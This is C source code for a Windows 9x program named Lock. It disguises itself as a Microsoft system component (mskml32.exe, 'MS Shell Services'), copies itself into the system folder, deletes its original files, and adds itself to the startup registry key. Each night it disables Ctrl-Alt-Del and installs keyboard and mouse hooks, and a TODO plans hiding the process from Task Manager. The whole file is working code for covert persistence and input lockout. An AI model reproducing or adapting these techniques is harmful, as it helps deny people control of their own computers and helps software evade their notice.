/*=============================================================================
*	
*	Copyright (c) 2000 Arthur Boynagryan (a.k.a. LayZee_Cat).
*		All rights reserved.
*    
*	Redistribution and use in source and binary forms, with or without
*	modification, are permitted provided that the following conditions
*	are met:
*	1. Redistributions of source code must retain the above copyright
*	   notice, this list of conditions and the following disclaimer as
*	   the first lines of this file unmodified.
*	2. Redistributions in binary form must reproduce the above copyright
*      notice, this list of conditions and the following disclaimer in the
*      documentation and/or other materials provided with the distribution.
*
*	THIS SOFTWARE IS PROVIDED BY ARTHUR BOYNAGRYAN "AS IS" AND ANY EXPRESS OR
*	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
*	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
*	IN NO EVENT SHALL ARTHUR BOYNAGRYAN BE LIABLE FOR ANY DIRECT, INDIRECT,
*	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
*	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
*	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
*	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
*	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
*	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*
*	The author of this program may be contacted at boynagar@armentel.com
*
*=============================================================================
*/

#include "Lock.h"

#define REGISTRY_APP_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Services"
#define REGISTRY_RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
#define REGISTRY_KEY_NAME "MS Shell Services"
//#define REGISTRY_RUN_KEY_NT "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define MUTEX_UNIQUE_NAME "Lock_c_mutex_200011021159_11909"
#define ALTERNATIVE_NAME "mskml32.exe"
#define ALTERNATIVE_NAME_DLL "mskml32.dll"

BOOL g_bLockFinished;		// Set this to TRUE when you want to exit Lock

__int64 FileTimeToQuadWord(LPFILETIME lpFileTime)
{
	__int64 qw;
	qw = lpFileTime->dwHighDateTime;
	qw <<= 32;
	qw |= lpFileTime->dwLowDateTime;

	return (qw);
}

BOOL LockSpecialKeys(PUINT fuiState)
{
	return SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, TRUE, fuiState, 0);
}

BOOL UnlockSpecialKeys(PUINT fuiState)
{
	return SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, FALSE, fuiState, 0);
}

HHOOK StartKeyboardHook(HMODULE hModule)
{
	HHOOK hHook = NULL;
	HOOKPROC hKeyboardProc = NULL;		// handle to keyboard hook procedure
	
	hKeyboardProc = (HOOKPROC) GetProcAddress(hModule, "KeyProc");

	if (hKeyboardProc != NULL)
	{
		//MessageBox(NULL, "in hook", NULL, MB_OK);
		hHook = SetWindowsHookEx(WH_KEYBOARD, hKeyboardProc, hModule, 0);
		SetKeyboardHook(hHook);
	}
	
	return (hHook);
}

HHOOK StartMouseHook(HMODULE hModule)
{
	HHOOK hHook = NULL;
	HOOKPROC hMouseProc = NULL;		// handle to mouse hook procedure

	hMouseProc = (HOOKPROC) GetProcAddress(hModule, "MouseProc");

	if (hMouseProc != NULL)
	{
		hHook = SetWindowsHookEx(WH_MOUSE, hMouseProc, hModule, 0);
		SetMouseHook(hHook);
	}

	return (hHook);
}

BOOL EndHook(HHOOK hHook)
{
	return UnhookWindowsHookEx(hHook);
}

void MainLoop(LPTIMEINFO tiParam)
{
	SYSTEMTIME st, tempStart, tempEnd;
	FILETIME ft;
	__int64 qwCurrentTime, qwStartTime, qwEndTime;	// qw stands for quadword
	UINT fuiPreviousState;	// undocumented parameter: applications are not supposed to pass
							// SPI_SETSCREENSAVERRUNNING flag to SystemParametersInfo()
							// function, it is used internally on Windows 9x
	HHOOK hKeyboardHook, hMouseHook;
	HMODULE hMod;				// handle to a module that contains keyboard hook procedure
	
	struct tm temp;
	time_t tempresult;
	
	while (!g_bLockFinished)
	{
		// since we want to check minutes also, we gotta do some arithmetics with times
		hKeyboardHook = NULL;
		hMouseHook = NULL;
		GetLocalTime(&st);
		tempStart = st;
		tempEnd = st;
		tempStart.wHour = tiParam->dwStartHour;
		tempStart.wMinute = tiParam->dwStartMinute;
		tempEnd.wHour = tiParam->dwEndHour;
		tempEnd.wMinute = tiParam->dwEndMinute;

		SystemTimeToFileTime(&st,&ft);
		qwCurrentTime = FileTimeToQuadWord(&ft);
		
		SystemTimeToFileTime(&tempStart,&ft);
		qwStartTime = FileTimeToQuadWord(&ft);

		if (tiParam->dwEndHour < tiParam->dwStartHour)
		{
			// Well, the easiest solution (for setting the date to the next day)
			// I could come up with was to use mktime() and localtime() functions
			
			tempEnd.wHour += 24;

			temp.tm_hour = tempEnd.wHour;
			temp.tm_isdst = -1;					// Get timezone (daylight savings time) 
												// information from the system
			temp.tm_mday = tempEnd.wDay;
			temp.tm_min = tempEnd.wMinute;
			temp.tm_mon = tempEnd.wMonth - 1;	// because wMonth member in SYSTEMTIME is 1 based
												// (January = 1), whereas tm_mon member in tm is 
												// 0 based (January = 0)
			temp.tm_sec = tempEnd.wSecond;
			temp.tm_wday = tempEnd.wDayOfWeek;
			temp.tm_yday = -1;					 // SYSTEMTIME structure does not contain that info
			temp.tm_year = tempEnd.wYear - 1900; // that's because time functions use year value 
												 // without the 1900 part
	
			tempresult = mktime(&temp);		// fixes the illegal values passed in struct tm, thus
											// giving us the date for the next day
			temp = *localtime(&tempresult);	// convert time_t value returned by mktime() back to tm

			tempEnd.wDay = temp.tm_mday;
			tempEnd.wMonth = temp.tm_mon + 1;		// see comments above
			tempEnd.wYear = temp.tm_year + 1900;	// see comments above
			tempEnd.wDayOfWeek = temp.tm_wday;
			tempEnd.wHour = temp.tm_hour;
			tempEnd.wMinute = temp.tm_min;
			tempEnd.wSecond = temp.tm_sec;
		}

		SystemTimeToFileTime(&tempEnd,&ft);
		qwEndTime = FileTimeToQuadWord(&ft);

		// Instead of converting FILETIME to __int64, it is also possible
		// to use 3 FILETIME structures and compare them using
		// CompareFileTime() function

		while (qwCurrentTime < qwStartTime)
		{
			Sleep(5000);
			GetLocalTime(&st);
			SystemTimeToFileTime(&st,&ft);
			qwCurrentTime = FileTimeToQuadWord(&ft);
		}

		hMod = LoadLibrary("LockScr.dll");
		if (hMod == NULL)
		{
			hMod = LoadLibrary(ALTERNATIVE_NAME_DLL);
			if (hMod == NULL)
			{
				g_bLockFinished = TRUE;
			}
		}

		LockSpecialKeys(&fuiPreviousState);

		if (hMod != NULL)
		{
			hKeyboardHook = StartKeyboardHook(hMod);
			hMouseHook = StartMouseHook(hMod);
		}

		while (qwCurrentTime < qwEndTime)
		{
			Sleep(5000);
			GetLocalTime(&st);
			SystemTimeToFileTime(&st,&ft);
			qwCurrentTime = FileTimeToQuadWord(&ft);
		}

		UnlockSpecialKeys(&fuiPreviousState);
		/*if (EndHook(hKeyboardHook) == FALSE)
		{
			MessageBox(NULL, "oj pizdets!", NULL, MB_OK);
		}*/
		EndHook(hKeyboardHook);
		EndHook(hMouseHook);
	}
}

void HideThis()
{
	// Currently it is unimplemented
	// TODO: Here I need to implement process hiding, so that it does not show up
	// in Task Manager when the user presses CTRL-ALT-DEL (this applies only to 
	// Windows 9x systems, because on Windows NT/2000 it's easier to do).
	// One way to do this is to use RegisterServiceProcess undocumented function.
}

int Initialize()
{
	// Values of nResult:
	// 0: Not installed
	// 1: Installed, not run from anywhere
	// 2: Installed, run from user registry key
	//		Applies to NT only, therefore not used
	// 3: Installed, run from system-wide registry key
	// 4: Installed, run as service
	//		Applies to NT only, therefore not used

	int nResult = 0;
	int nResultDll = 0;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	int i;
	HMODULE hMod;

	char szModuleName[512], szDllName[512], *szFilePart, *szDllPart;
	char szCmdLine[2048];
	char szTargetFullPath[MAX_PATH];
	char szTargetDllPath[MAX_PATH];
	char szTargetFileName[MAX_PATH] = ALTERNATIVE_NAME;
	char szTargetDllName[MAX_PATH] = ALTERNATIVE_NAME_DLL;

	hMod = LoadLibrary("LockScr.dll");
	if (hMod == NULL)
	{
		hMod = LoadLibrary(ALTERNATIVE_NAME_DLL);
	}

	if (hMod != NULL)
	{
		GetModuleFileName(hMod, szDllName, 512);
		GetFullPathName(szDllName, MAX_PATH, szDllName, &szDllPart);
		GetSystemDirectory(szTargetDllPath, MAX_PATH-1);
		lstrcat(szTargetDllPath,"\\");
		lstrcpyn(szTargetDllPath + lstrlen(szTargetDllPath), szTargetDllName, MAX_PATH - lstrlen(szTargetDllPath));
		if (GetFileAttributes(szTargetDllPath) != 0xFFFFFFFF)
		{
			nResultDll = 1;
		}
		else
		{
			// copy the DLL: make 5 attempts and then continue
			FreeLibrary(hMod);
			i = 0;
			while (CopyFile(szDllName, szTargetDllPath, FALSE) == FALSE && i < 5)
			{
				Sleep(1000);
				i++;
			}
		}
	}

	GetModuleFileName(NULL, szModuleName, 512);
	GetFullPathName(szModuleName, MAX_PATH, szModuleName, &szFilePart);
	GetSystemDirectory(szTargetFullPath, MAX_PATH-1);

	lstrcat(szTargetFullPath,"\\");
	lstrcpyn(szTargetFullPath + lstrlen(szTargetFullPath), szTargetFileName, MAX_PATH - lstrlen(szTargetFullPath));
	
	if (GetFileAttributes(szTargetFullPath) != 0xFFFFFFFF)
	{
		nResult = 1;
	}
	
	if (nResult == 1)
	{
		HKEY hkRegKey;

		if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkRegKey, NULL) == ERROR_SUCCESS)
		{
			DWORD dwLen = 512;
			char szRegPath[512];
			//if (RegQueryValueEx(hkRegKey, szFilePart, NULL, NULL, (BYTE *)szRegPath, &dwLen) == ERROR_SUCCESS)
			if (RegQueryValueEx(hkRegKey, REGISTRY_KEY_NAME, NULL, NULL, (BYTE *)szRegPath, &dwLen) == ERROR_SUCCESS)
			{
				if (lstrcmpi(szRegPath, szTargetFullPath) == 0)
				{
						nResult = 3;
				}
			}
		}
	}
	
	if (nResult == 0)
	{
		// Make copy of file: 5 attempts
		i = 0;
		while (CopyFile(szModuleName, szTargetFullPath, FALSE) == FALSE && i < 5)
		{
			Sleep(1000);
			i++;
		}

		// Run the copy from %SYSTEM% folder
		lstrcpyn(szCmdLine, szTargetFullPath, 2048);
		lstrcpyn(szCmdLine+lstrlen(szCmdLine), " ", 2048-lstrlen(szCmdLine));
		lstrcpyn(szCmdLine+lstrlen(szCmdLine), szModuleName, 2048-lstrlen(szCmdLine));

		if (nResultDll == 0)
		{
			// Also try to delete the original DLL, since we probably already copied it
			lstrcpyn(szCmdLine+lstrlen(szCmdLine), " ", 2048-lstrlen(szCmdLine));
			lstrcpyn(szCmdLine+lstrlen(szCmdLine), szDllName, 2048-lstrlen(szCmdLine));
		}
		
		memset(&si,0,sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_FORCEOFFFEEDBACK; // don't change the shape of cursor
			
		CreateProcess(NULL, szCmdLine, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);

		ExitProcess(0);
	}
		
	if ((nResult > 0) && (nResult < 3))
	{
		HKEY hkRegKey;
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_RUN_KEY, 0, KEY_ALL_ACCESS, &hkRegKey) == ERROR_SUCCESS)
		{
			//if(RegSetValueEx(hkRegKey, szFilePart, 0, REG_SZ, (BYTE *)szTargetFullPath, lstrlen(szTargetFullPath)) == ERROR_SUCCESS)
			if(RegSetValueEx(hkRegKey, REGISTRY_KEY_NAME, 0, REG_SZ, (BYTE *)szTargetFullPath, lstrlen(szTargetFullPath)) == ERROR_SUCCESS)
			{
				nResult = 3;
			}
			RegCloseKey(hkRegKey);
		}
	}
		
	return (nResult);
}

int WINAPI WinMain(
  HINSTANCE hInstance,      // handle to current instance
  HINSTANCE hPrevInstance,  // handle to previous instance
  LPSTR lpCmdLine,          // command line
  int nCmdShow              // show state
)
{
	HKEY hkResult;				// handle to registry keys that store our data
	HRESULT hResult;			// stores the result of registry access functions
	TIMEINFO ti;				// my structure that holds start and end times from registry
	DWORD dwBufSize;			// buffer size: used in registry access functions
	char *szMutexName;			// mutex name: make this as unique as possible
	HANDLE hMutex;				// handle to a mutex used to prevent multiple instances
	int argc;
	char** argv;
	char* szOldName;
	int i;
	int t;
	HMODULE hMod;
	
	UNREFERENCED_PARAMETER(nCmdShow);
	UNREFERENCED_PARAMETER(lpCmdLine);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(hInstance);

	argc = __argc;
	argv = __argv;

	if (argc > 1)
	{
		szOldName = argv[1];
		i = 0;
		while(DeleteFile(szOldName) == FALSE && i < 5)
		{
			if (GetLastError() == ERROR_FILE_NOT_FOUND)
				break;
			Sleep(1000);
			i++;
		}

		if (argc > 2)	// Also delete DLL
		{
			szOldName = argv[2];
			hMod = GetModuleHandle(szOldName);
			t = FreeLibrary(hMod);
			i = 0;
			while(DeleteFile(szOldName) == FALSE && i < 5)
			{
				if (GetLastError() == ERROR_FILE_NOT_FOUND)
					break;
				Sleep(1000);
				i++;
			}
		}
	}

	Initialize();
	//HideThis();

	szMutexName = "Lock_c_mutex_20001102115933_11909";
	hMutex = CreateMutex(NULL, TRUE, szMutexName);
	if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS)
	{
		// A mutex with this name could not be created or already exists, 
		// Quit now.

		return (-1);
	}
	
	memset(&ti,0,sizeof(TIMEINFO));		// clear TIMEINFO structure
	ti.cbSize = sizeof(TIMEINFO);		// set the size of it: may need it in later versions

	// Retrieve data from registry
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_APP_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, NULL);
	hResult = RegQueryValueEx(hkResult, "ServiceStart1", NULL, NULL, (LPBYTE) &ti.dwStartHour, &dwBufSize);

	if (hResult == ERROR_FILE_NOT_FOUND || ti.dwStartHour > 23 || ti.dwStartHour < 0)
	{
		ti.dwStartHour = 19; // Default start hour ('cause you know how the things go in ArmenTel :) )
		hResult = RegSetValueEx(hkResult, "ServiceStart1", 0, REG_DWORD, (LPBYTE) &ti.dwStartHour, sizeof(DWORD));		
	}

	hResult = RegQueryValueEx(hkResult, "ServiceStart2", NULL, NULL, (LPBYTE) &ti.dwStartMinute, &dwBufSize);

	if (hResult == ERROR_FILE_NOT_FOUND || ti.dwStartMinute > 59 || ti.dwStartMinute < 0)
	{
		ti.dwStartMinute = 0;
		hResult = RegSetValueEx(hkResult, "ServiceStart2", 0, REG_DWORD, (LPBYTE) &ti.dwStartMinute, sizeof(DWORD));		
	}

	hResult = RegQueryValueEx(hkResult, "ServiceEnd1", NULL, NULL, (LPBYTE) &ti.dwEndHour, &dwBufSize);

	if (hResult == ERROR_FILE_NOT_FOUND || ti.dwEndHour > 23 || ti.dwEndHour < 0)
	{
		ti.dwEndHour = 9; // Default end hour: in ArmenTel work starts at 9:00
		hResult = RegSetValueEx(hkResult, "ServiceEnd1", 0, REG_DWORD, (LPBYTE) &ti.dwEndHour, sizeof(DWORD));		
	}

	hResult = RegQueryValueEx(hkResult, "ServiceEnd2", NULL, NULL, (LPBYTE) &ti.dwEndMinute, &dwBufSize);

	if (hResult == ERROR_FILE_NOT_FOUND || ti.dwEndMinute > 59 || ti.dwEndMinute < 0)
	{
		ti.dwEndMinute = 0;
		hResult = RegSetValueEx(hkResult, "ServiceEnd2", 0, REG_DWORD, (LPBYTE) &ti.dwEndMinute, sizeof(DWORD));
	}
	
	// Global variable that signals whether we want to exit this program
	// if FALSE, this program always runs
	// Set this to true whenever you want to exit.
	g_bLockFinished = FALSE;

	MainLoop(&ti);
		
	CloseHandle(hMutex);	// even though the system closes the hadle automatically
							// when the process exits

	return 0;
}
